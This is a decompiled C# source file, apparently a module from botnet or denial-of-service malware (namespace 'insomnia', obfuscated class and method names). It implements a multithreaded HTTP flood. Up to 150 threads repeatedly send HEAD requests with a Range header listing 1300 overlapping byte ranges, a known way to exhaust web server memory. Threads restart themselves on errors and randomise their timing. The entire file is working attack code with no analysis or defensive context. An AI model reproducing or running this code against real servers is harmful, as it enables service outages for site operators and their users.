using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia;

internal class Class20
{
	public static string Field8 = Method4();

	public static string Field7;

	public static int Field6 = 80;

	public static int Field5 = 150;

	private static IPEndPoint Field4;

	private static ThreadStart[] Field3;

	private static Thread[] Field2;

	public static bool Field1 = false;

	private static string Method4()
	{
		string text = "";
		for (int i = 0; i < 1300; i++)
		{
			text = text + ",5-" + i;
		}
		return text;
	}

	public static void Method3()
	{
		try
		{
			Field4 = new IPEndPoint(Dns.GetHostEntry(Field7).AddressList[0], Field6);
		}
		catch
		{
			Field4 = new IPEndPoint(IPAddress.Parse(Field7), Field6);
		}
		Field2 = new Thread[Field5];
		Field3 = new ThreadStart[Field5];
		for (int i = 0; i < Field5; i++)
		{
			Field3[i] = Method1;
			Field2[i] = new Thread(Field3[i]);
			Field2[i].Start();
		}
	}

	public static void Method2()
	{
		for (int i = 0; i < Field5; i++)
		{
			try
			{
				Field2[i].Suspend();
			}
			catch
			{
			}
		}
	}

	private static void Method1()
	{
		try
		{
			string format = "HEAD / HTTP/1.1\r\nHost: {0}\r\nRange:bytes=0-{1}\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
			string s = string.Format(format, Field7, Field8);
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			Socket socket = Class36.Method1(Field4.Address.ToString(), Field6);
			while (true)
			{
				socket.Send(bytes, bytes.Length, SocketFlags.None);
				Thread.Sleep(Class39.Method12(2000, 10000));
			}
		}
		catch
		{
			Method1();
		}
	}
}
